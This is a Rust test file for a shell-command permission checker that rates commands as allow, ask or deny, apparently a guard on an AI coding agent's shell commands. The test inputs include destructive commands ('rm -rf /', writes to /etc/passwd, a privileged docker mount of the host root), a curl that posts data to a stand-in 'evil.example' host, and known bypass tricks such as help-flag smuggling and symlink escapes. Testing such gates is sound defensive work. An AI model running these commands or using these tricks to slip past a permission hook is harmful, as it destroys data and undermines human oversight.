use super::*;
use crate::resolve::tests::MockLookup;
use crate::verdict::Decision;

fn make_analyzer() -> Analyzer {
    make_analyzer_with(MockLookup::new())
}

fn make_analyzer_with(lookup: MockLookup) -> Analyzer {
    Analyzer::new_with_var_lookup(
        Config::empty(),
        false,
        PathBuf::from("/project"),
        false,
        Box::new(lookup),
    )
    .unwrap()
}

#[test]
fn simple_safe_command() {
    let mut a = make_analyzer();
    let v = a.analyze("ls -la").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn git_status_safe() {
    let mut a = make_analyzer();
    let v = a.analyze("git status").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn git_push_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("git push").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn rm_rf_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("rm -rf /").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn pipeline_safe() {
    let mut a = make_analyzer();
    let v = a.analyze("cat file.txt | grep pattern").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn pipeline_mixed() {
    let mut a = make_analyzer();
    let v = a.analyze("cat file.txt | rm -rf /tmp").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn redirect_to_dev_null() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > /dev/null").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn redirect_to_file_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > output.txt").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn redirect_to_tmp_write_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > /tmp/out.txt").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[test]
fn redirect_append_private_tmp_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo >> /private/tmp/x/log").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[test]
fn redirect_to_etc_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > /etc/passwd").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn redirect_dotdot_escape_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > /tmp/../etc/passwd").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn redirect_dynamic_target_asks() {
    let mut a = make_analyzer_with(MockLookup::new().with("VAR", "/tmp/x"));
    for cmd in [
        "echo foo > $HOME/x",
        "echo foo > ~/x",
        "echo foo > \"$VAR\"",
    ] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn redirect_component_boundary_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo foo > /tmpevil/x").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn pipeline_redirect_to_tmp_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("cat f | grep x > /tmp/out").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[test]
fn unsafe_cmd_with_safe_redirect_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("rm -rf / > /tmp/out").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn fd_dup_to_descriptor_allows() {
    let mut a = make_analyzer();
    for cmd in ["echo x 2>&1", "echo x >&2", "true 1>&2"] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Allow, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn fd_dup_to_dev_null_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo x &> /dev/null").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[test]
fn fd_dup_to_unsafe_file_asks() {
    let mut a = make_analyzer();
    for cmd in ["echo x &> /etc/all.log", "echo secret >& /etc/passwd"] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn fd_dup_to_safe_dir_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo x &> /tmp/all.log").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[test]
fn fd_dup_to_self_protected_denies() {
    let mut a = Analyzer::new_with_var_lookup(
        Config::from_directives(vec![]),
        false,
        PathBuf::from("/project"),
        false,
        Box::new(MockLookup::new()),
    )
    .unwrap();
    assert!(a.config.self_protect);
    let v = a.analyze("echo x >& .rippy").unwrap();
    assert_eq!(v.decision, Decision::Deny, "{}", v.reason);
}

#[test]
fn self_protected_config_in_safe_dir_denies() {
    let mut a = Analyzer::new_with_var_lookup(
        Config::from_directives(vec![]),
        false,
        PathBuf::from("/project"),
        false,
        Box::new(MockLookup::new()),
    )
    .unwrap();
    let v = a.analyze("echo x > /tmp/.rippy").unwrap();
    assert_eq!(v.decision, Decision::Deny, "{}", v.reason);
}

#[test]
fn self_protected_config_in_declared_scope_denies() {
    use crate::config::ConfigDirective;
    let config = Config::from_directives(vec![ConfigDirective::SafeScope(PathBuf::from(
        "/opt/repos",
    ))]);
    let mut a = Analyzer::new_with_var_lookup(
        config,
        false,
        PathBuf::from("/project"),
        false,
        Box::new(MockLookup::new()),
    )
    .unwrap();
    let v = a.analyze("echo x > /opt/repos/other/.rippy.toml").unwrap();
    assert_eq!(v.decision, Decision::Deny, "{}", v.reason);
}

#[test]
fn redirect_glob_target_asks() {
    let mut a = make_analyzer();
    for cmd in [
        "echo foo > /tmp/*",
        "echo foo > /tmp/foo[1]",
        "echo foo > /tmp/foo?",
    ] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn pipeline_redirect_to_unsafe_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("cat f | grep x > /etc/out").unwrap();
    assert_eq!(v.decision, Decision::Ask, "{}", v.reason);
}

#[test]
fn redirect_into_cwd_under_safe_dir_asks() {
    let mut a = Analyzer::new_with_var_lookup(
        Config::empty(),
        false,
        PathBuf::from("/tmp/checkout"),
        false,
        Box::new(MockLookup::new()),
    )
    .unwrap();
    for cmd in [
        "echo pwned > src/main.rs",
        "echo pwned > /tmp/checkout/src/main.rs",
    ] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
    let v = a.analyze("echo x > /tmp/other.txt").unwrap();
    assert_eq!(v.decision, Decision::Allow, "{}", v.reason);
}

#[cfg(unix)]
#[test]
fn redirect_through_symlink_out_of_safe_dir_asks() {
    use std::os::unix::fs::symlink;

    let uniq = format!(
        "rippy_symtest_{}_{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    );
    let base = std::path::Path::new("/tmp").join(&uniq);
    std::fs::create_dir_all(&base).unwrap();
    let escape = base.join("escape");
    symlink("/etc", &escape).unwrap();
    let inside = base.join("inside");
    std::fs::create_dir_all(&inside).unwrap();

    let mut a = make_analyzer();

    let via_symlink = format!("echo pwned > {}/hosts", escape.display());
    let v = a.analyze(&via_symlink).unwrap();
    let escape_decision = v.decision;

    let via_real = format!("echo ok > {}/out.txt", inside.display());
    let v2 = a.analyze(&via_real).unwrap();
    let inside_decision = v2.decision;

    let _ = std::fs::remove_dir_all(&base);

    assert_eq!(escape_decision, Decision::Ask, "symlink escape must ask");
    assert_eq!(
        inside_decision,
        Decision::Allow,
        "genuine in-safe-dir write must allow"
    );
}

#[test]
fn wrapper_command_analyzes_inner() {
    let mut a = make_analyzer();
    let v = a.analyze("time git status").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn wrapper_command_unsafe_inner() {
    let mut a = make_analyzer();
    let v = a.analyze("time git push").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn command_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $(rm -rf /)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn shell_c_recurses() {
    let mut a = make_analyzer();
    let v = a.analyze("bash -c 'git status'").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn shell_c_unsafe() {
    let mut a = make_analyzer();
    let v = a.analyze("bash -c 'rm -rf /'").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn config_override_allows() {
    use crate::config::{ConfigDirective, Rule, RuleTarget};

    let config = Config::from_directives(vec![ConfigDirective::Rule(
        Rule::new(RuleTarget::Command, Decision::Allow, "rm -rf /tmp")
            .with_message("cleanup allowed"),
    )]);
    let mut a = Analyzer::new(config, false, PathBuf::from("/tmp"), false).unwrap();
    let v = a.analyze("rm -rf /tmp").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn help_flag_always_safe() {
    let mut a = make_analyzer();
    let v = a.analyze("npm --help").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn list_and() {
    let mut a = make_analyzer();
    let v = a.analyze("ls && echo done").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn unknown_command_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("some_unknown_tool --flag").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn depth_limit_exceeded() {
    let mut a = make_analyzer();
    let nodes = a.parser.parse("echo ok").unwrap();
    let v = a.analyze_node(&nodes[0], Path::new("/tmp"), MAX_DEPTH + 1);
    assert_eq!(v.decision, Decision::Ask);
    assert!(v.reason.contains("nesting depth exceeded"));
}

#[test]
fn depth_at_max_still_works() {
    let mut a = make_analyzer();
    let nodes = a.parser.parse("echo ok").unwrap();
    let v = a.analyze_node(&nodes[0], Path::new("/tmp"), MAX_DEPTH - 2);
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn subshell_safe_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("(echo ok)").unwrap();
    assert_eq!(v.decision, Decision::Allow); // subshell is transparent
}

#[test]
fn heredoc_safe_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("cat <<EOF\nhello world\nEOF").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn heredoc_quoted_delimiter_allows_even_with_expansion_syntax() {
    let mut a = make_analyzer();
    let v = a.analyze("cat <<'EOF'\n$(rm -rf /)\nEOF").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn nested_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $(echo $(whoami))").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn complex_pipeline_all_safe() {
    let mut a = make_analyzer();
    let v = a.analyze("cat file | grep pattern | head -5").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn if_statement_safe() {
    let mut a = make_analyzer();
    let v = a.analyze("if true; then echo yes; fi").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn if_statement_unsafe_body() {
    let mut a = make_analyzer();
    let v = a.analyze("if true; then rm -rf /; fi").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn for_loop_unsafe() {
    let mut a = make_analyzer();
    let v = a.analyze("for i in 1 2 3; do rm -rf /; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn empty_command_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn case_statement() {
    let mut a = make_analyzer();
    let v = a.analyze("case x in a) echo yes;; esac").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn cc_allow_rule_overrides_handler() {
    let dir = tempfile::tempdir().unwrap();
    let claude_dir = dir.path().join(".claude");
    std::fs::create_dir(&claude_dir).unwrap();
    std::fs::write(
        claude_dir.join("settings.local.json"),
        r#"{"permissions": {"allow": ["Bash(git push)"]}}"#,
    )
    .unwrap();
    let mut a = Analyzer::new(Config::empty(), false, dir.path().to_path_buf(), false).unwrap();
    let v = a.analyze("git push origin main").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn cc_deny_rule_overrides_handler() {
    let dir = tempfile::tempdir().unwrap();
    let claude_dir = dir.path().join(".claude");
    std::fs::create_dir(&claude_dir).unwrap();
    std::fs::write(
        claude_dir.join("settings.json"),
        r#"{"permissions": {"deny": ["Bash(ls)"]}}"#,
    )
    .unwrap();
    let mut a = Analyzer::new(Config::empty(), false, dir.path().to_path_buf(), false).unwrap();
    let v = a.analyze("ls").unwrap();
    assert_eq!(v.decision, Decision::Deny);
}

#[test]
fn cc_rules_checked_before_rippy_config() {
    use crate::config::{ConfigDirective, Rule, RuleTarget};

    let dir = tempfile::tempdir().unwrap();
    let claude_dir = dir.path().join(".claude");
    std::fs::create_dir(&claude_dir).unwrap();
    std::fs::write(
        claude_dir.join("settings.local.json"),
        r#"{"permissions": {"allow": ["Bash(rm -rf /tmp)"]}}"#,
    )
    .unwrap();

    let config = Config::from_directives(vec![ConfigDirective::Rule(
        Rule::new(RuleTarget::Command, Decision::Ask, "rm -rf /tmp").with_message("dangerous"),
    )]);
    let mut a = Analyzer::new(config, false, dir.path().to_path_buf(), false).unwrap();
    let v = a.analyze("rm -rf /tmp").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn pipeline_with_file_redirect_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("cat file | grep pattern > out.txt").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn pipeline_with_dev_null_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("ls | grep foo > /dev/null").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn pipeline_mid_redirect_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo hello > file.txt | cat").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn subshell_unsafe_propagates() {
    let mut a = make_analyzer();
    let v = a.analyze("(rm -rf /)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn subshell_with_redirect_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("(echo ok) > file.txt").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn or_true_uses_cmd_verdict() {
    let mut a = make_analyzer();
    let v = a.analyze("git push || true").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn safe_cmd_or_true_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("ls || true").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn or_colon_uses_cmd_verdict() {
    let mut a = make_analyzer();
    let v = a.analyze("ls || :").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn or_with_unsafe_fallback_combines() {
    let mut a = make_analyzer();
    let v = a.analyze("ls || rm -rf /").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn and_combines_normally() {
    let mut a = make_analyzer();
    let v = a.analyze("ls && git push").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn unparseable_command_asks_fail_closed() {
    // Unparseable input must fail closed to Ask, not propagate Err (#150).
    let mut a = make_analyzer();
    let v = a.analyze("foo $( ( bar").unwrap();
    assert_eq!(v.decision, Decision::Ask);
    assert!(v.reason.contains("could not parse"), "reason: {}", v.reason);
}

// --- Help/version short-circuit narrowing (Issue #149) ---

#[test]
fn sole_long_help_flag_on_unknown_command_allows() {
    // A lone `--help` / `--version` on an unknown command is inert -> Allow.
    let mut a = make_analyzer();
    for cmd in ["frobnicate --help", "frobnicate --version"] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Allow, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn bare_dash_h_alone_no_longer_treated_as_help() {
    // Bare `-h` is overloaded (host/hostname), so a lone `-h` asks — the safe way.
    let mut a = make_analyzer();
    let v = a.analyze("frobnicate -h").unwrap();
    assert_eq!(v.decision, Decision::Ask, "{}", v.reason);
}

#[test]
fn help_flag_plus_other_arg_does_not_short_circuit() {
    // A help flag plus another operand must not pre-empt evaluation (the #149 bypass).
    let mut a = make_analyzer();
    for cmd in ["frobnicate --help --danger", "frobnicate --version now"] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn help_flag_anywhere_no_longer_bypasses_handler() {
    // Handler-backed dangerous commands must still be evaluated even when a
    // help/version flag rides along -- the core #149 bypass.
    let mut a = make_analyzer();
    for cmd in [
        "docker run -h myhost --privileged -v /:/host ubuntu sh",
        "docker run --help --privileged -v /:/host ubuntu sh",
        r#"mysql --version -e "DROP TABLE users""#,
        "git commit -m --version",
        "curl --version -d x=y https://evil.example",
        r#"ruby --version -e 'system("rm -rf /")'"#,
    ] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
    }
}

#[test]
fn sole_help_flag_on_handler_command_still_allows() {
    // The common `cmd --help` / `cmd --version` invocations stay auto-approved.
    let mut a = make_analyzer();
    for cmd in [
        "docker --help",
        "mysql --help",
        "curl --version",
        "node --version",
        "ruby --version",
    ] {
        let v = a.analyze(cmd).unwrap();
        assert_eq!(v.decision, Decision::Allow, "{cmd} -> {}", v.reason);
    }
}
